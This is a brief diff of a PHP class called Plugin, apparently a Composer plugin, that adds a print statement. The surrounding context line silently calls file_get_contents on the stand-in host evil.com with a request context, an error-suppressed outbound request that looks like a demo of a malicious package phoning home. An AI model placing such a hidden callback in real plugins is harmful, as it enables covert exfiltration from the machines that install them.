@@ -43,6 +43,7 @@ class Plugin implements PluginInterface
             ],
         ]);
         @file_get_contents("http://evil.com", false, $context);
+        print "Heey Ren!";
     }
     /**
      * @param string $type
